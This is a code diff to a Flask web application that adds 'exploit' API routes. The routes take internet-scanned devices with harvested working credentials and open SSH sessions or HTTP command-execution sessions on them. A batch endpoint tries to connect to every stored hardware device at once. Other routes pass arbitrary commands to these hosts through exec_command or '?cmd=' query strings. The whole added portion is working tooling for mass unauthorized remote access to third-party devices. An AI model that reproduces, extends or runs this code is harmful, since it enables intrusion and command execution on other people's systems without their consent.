@@ -1,7 +1,7 @@
 import os, json, uuid, queue, threading, time
 from datetime import datetime, timezone
 from functools import wraps
-from flask import Flask, render_template, request, jsonify, Response
+from flask import Flask, render_template, request, jsonify, Response, stream_with_context
 from dotenv import load_dotenv
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -24,6 +24,29 @@ if SUPABASE_URL and supabase_key:
         print(f"[!] Supabase init error: {e}")
 
 INVITE_ONLY = os.environ.get("INVITE_ONLY", "true").lower() == "true"
+
+# ── Exploitation / SSH session management ──
+try:
+    import paramiko
+    HAS_PARAMIKO = True
+except ImportError:
+    HAS_PARAMIKO = False
+
+exploit_sessions = {}
+exploit_lock = threading.Lock()
+
+def get_exploit_session(sid):
+    with exploit_lock:
+        return exploit_sessions.get(sid)
+
+def del_exploit_session(sid):
+    with exploit_lock:
+        if sid in exploit_sessions:
+            sess = exploit_sessions.pop(sid)
+            try:
+                sess["ssh"].close()
+            except:
+                pass
 
 def get_supabase():
     return supabase
@@ -524,7 +547,8 @@ def api_access_device(user, item_id):
             result = {"status": "ok", "config": r.text[:5000]}
         elif action == "shell":
             cmd = body.get("command", "id")
-            for ep in ["/exec", "/cgi-bin/exec", "/shell", "/cmd", "/console"]:
+            from seclist_loader import get_exploit_endpoints
+            for ep in get_exploit_endpoints(item.get("device", "")):
                 try:
                     r = http_req.get(f"{scheme}://{ip}:{port}{ep}?cmd={cmd}", auth=(u, p), timeout=5, verify=False)
                     if r.status_code == 200:
@@ -539,6 +563,243 @@ def api_access_device(user, item_id):
     except Exception as e:
         result["message"] = str(e)[:200]
     return jsonify(result)
+
+
+# ─────────────── Device Exploitation ───────────────
+
+@app.route("/api/exploit/classify", methods=["POST"])
+@require_auth
+def api_classify_device(user):
+    body = request.get_json(force=True) or {}
+    device_name = body.get("device", "")
+    from GetYourDevice import classify_device_type
+    ctype = classify_device_type(device_name)
+    return jsonify({"classification": ctype, "is_device": ctype == "device"})
+
+
+@app.route("/api/exploit/devices", methods=["GET"])
+@require_auth
+def api_exploit_devices(user):
+    from GetYourDevice import HARDWARE_DEVICE_NAMES
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("auth_found", True).order("id", desc=True).limit(500).execute()
+        devices = []
+        seen = set()
+        for it in resp.data:
+            ip = it.get("ip")
+            if ip in seen:
+                continue
+            seen.add(ip)
+            dn = (it.get("device") or "").lower()
+            is_hw = any(kw in dn for kw in HARDWARE_DEVICE_NAMES[:80])
+            if not is_hw:
+                continue
+            devices.append({
+                "id": it["id"],
+                "ip": it["ip"],
+                "port": it["port"],
+                "url": it.get("url"),
+                "device": it.get("device"),
+                "username": it.get("username"),
+                "password": it.get("password"),
+                "country_code": it.get("country_code"),
+                "org": it.get("org"),
+                "broken": it.get("broken", False),
+            })
+        return jsonify({"devices": devices, "total": len(devices)})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/exploit/connect", methods=["POST"])
+@require_auth
+def api_exploit_connect(user):
+    body = request.get_json(force=True) or {}
+    item_id = body.get("item_id")
+    if not item_id:
+        return jsonify({"error": "item_id required"}), 400
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("id", item_id).limit(1).execute()
+        if not resp.data:
+            return jsonify({"error": "device not found"}), 404
+        item = resp.data[0]
+        if not item.get("auth_found"):
+            return jsonify({"error": "no credentials available"}), 400
+        ip = item["ip"]
+        port = item["port"]
+        u = item.get("username", "admin")
+        p = item.get("password", "admin")
+
+        # Try SSH first
+        ssh_port = 22
+        ssh_ok = False
+        if HAS_PARAMIKO:
+            try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                client.connect(ip, port=ssh_port, username=u, password=p, timeout=8, banner_timeout=8)
+                sid = uuid.uuid4().hex[:12]
+                with exploit_lock:
+                    exploit_sessions[sid] = {
+                        "id": sid, "item_id": item_id, "ip": ip,
+                        "username": u, "password": p,
+                        "ssh": client, "protocol": "ssh",
+                        "created": time.time(),
+                        "user_id": user.id,
+                    }
+                return jsonify({"status": "ok", "protocol": "ssh", "session_id": sid})
+            except Exception as e:
+                pass  # SSH failed, try HTTP shell
+
+        # Fallback: HTTP shell session
+        sid = uuid.uuid4().hex[:12]
+        import requests as http_req
+        scheme = "https" if port in (443, 8443, 9443) else "http"
+        session = http_req.Session()
+        session.auth = (u, p)
+        with exploit_lock:
+            exploit_sessions[sid] = {
+                "id": sid, "item_id": item_id, "ip": ip,
+                "username": u, "password": p,
+                "session": session, "protocol": "http",
+                "scheme": scheme, "port": port,
+                "created": time.time(),
+                "user_id": user.id,
+            }
+        msg = "SSH unavailable, using HTTP shell" if not HAS_PARAMIKO else "SSH failed, using HTTP shell"
+        return jsonify({"status": "ok", "protocol": "http", "session_id": sid, "note": msg})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/api/exploit/session/<sid>/command", methods=["POST"])
+@require_auth
+def api_exploit_command(user, sid):
+    sess = get_exploit_session(sid)
+    if not sess:
+        return jsonify({"error": "session not found or expired"}), 404
+    if sess.get("user_id") != user.id:
+        return jsonify({"error": "not your session"}), 403
+    body = request.get_json(force=True) or {}
+    cmd = body.get("command", "id")
+    if not cmd:
+        return jsonify({"error": "command required"}), 400
+    try:
+        if sess.get("protocol") == "ssh":
+            _, stdout, stderr = sess["ssh"].exec_command(cmd, timeout=10)
+            out = stdout.read().decode(errors="replace")[:10000]
+            err = stderr.read().decode(errors="replace")[:5000]
+            return jsonify({"status": "ok", "output": out, "stderr": err})
+        else:
+            import requests as http_req
+            scheme = sess["scheme"]
+            ip = sess["ip"]
+            port = sess["port"]
+            target = f"{scheme}://{ip}:{port}"
+            from seclist_loader import get_exploit_endpoints
+            for ep in get_exploit_endpoints(sess.get("device", "")):
+                try:
+                    r = sess["session"].get(f"{target}{ep}?cmd={cmd}", timeout=5, verify=False)
+                    if r.status_code == 200:
+                        return jsonify({"status": "ok", "output": r.text[:10000], "endpoint": ep})
+                except:
+                    continue
+            return jsonify({"status": "ok", "output": "", "note": "No HTTP shell endpoint found"})
+    except Exception as e:
+        return jsonify({"error": str(e)[:300]}), 500
+
+
+@app.route("/api/exploit/session/<sid>/disconnect", methods=["POST"])
+@require_auth
+def api_exploit_disconnect(user, sid):
+    sess = get_exploit_session(sid)
+    if not sess:
+        return jsonify({"error": "session not found"}), 404
+    if sess.get("user_id") != user.id:
+        return jsonify({"error": "not your session"}), 403
+    try:
+        if sess.get("protocol") == "ssh":
+            sess["ssh"].close()
+    except:
+        pass
+    del_exploit_session(sid)
+    return jsonify({"status": "ok", "message": "disconnected"})
+
+
+@app.route("/api/exploit/sessions", methods=["GET"])
+@require_auth
+def api_exploit_sessions(user):
+    with exploit_lock:
+        sessions = []
+        for sid, s in exploit_sessions.items():
+            if s.get("user_id") == user.id:
+                sessions.append({
+                    "id": sid, "ip": s["ip"], "protocol": s.get("protocol", "http"),
+                    "username": s.get("username"), "created": s.get("created"),
+                    "item_id": s.get("item_id"),
+                })
+        return jsonify({"sessions": sessions, "count": len(sessions)})
+
+
+@app.route("/api/exploit/batch", methods=["POST"])
+@require_auth
+def api_exploit_batch(user):
+    """Try connecting to all hardware devices with creds automatically."""
+    from GetYourDevice import HARDWARE_DEVICE_NAMES
+    try:
+        resp = supabase.table("scan_result_items").select("*").eq("auth_found", True).order("id", desc=True).limit(200).execute()
+        results = []
+        for it in resp.data:
+            dn = (it.get("device") or "").lower()
+            if not any(kw in dn for kw in HARDWARE_DEVICE_NAMES[:80]):
+                continue
+            ip = it["ip"]
+            u = it.get("username", "admin")
+            p = it.get("password", "admin")
+            ssh_ok = False
+            if HAS_PARAMIKO:
+                try:
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(ip, port=22, username=u, password=p, timeout=6, banner_timeout=6)
+                    sid = uuid.uuid4().hex[:12]
+                    with exploit_lock:
+                        exploit_sessions[sid] = {
+                            "id": sid, "item_id": it["id"], "ip": ip,
+                            "username": u, "password": p,
+                            "ssh": client, "protocol": "ssh",
+                            "created": time.time(), "user_id": user.id,
+                        }
+                    results.append({"ip": ip, "status": "connected", "protocol": "ssh", "session_id": sid})
+                    ssh_ok = True
+                except:
+                    pass
+            if not ssh_ok:
+                import requests as http_req
+                scheme = "https" if it["port"] in (443, 8443, 9443) else "http"
+                try:
+                    r = http_req.get(f"{scheme}://{ip}:{it['port']}", auth=(u, p), timeout=5, verify=False)
+                    if r.status_code == 200:
+                        sid = uuid.uuid4().hex[:12]
+                        session = http_req.Session()
+                        session.auth = (u, p)
+                        with exploit_lock:
+                            exploit_sessions[sid] = {
+                                "id": sid, "item_id": it["id"], "ip": ip,
+                                "username": u, "password": p,
+                                "session": session, "protocol": "http",
+                                "scheme": scheme, "port": it["port"],
+                                "created": time.time(), "user_id": user.id,
+                            }
+                        results.append({"ip": ip, "status": "web_reachable", "session_id": sid})
+                    else:
+                        results.append({"ip": ip, "status": f"http_{r.status_code}"})
+                except Exception as e:
+                    results.append({"ip": ip, "status": "unreachable", "error": str(e)[:100]})
+        return jsonify({"results": results, "total": len(results)})
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
 
 # ─────────────── Scan API ───────────────
 
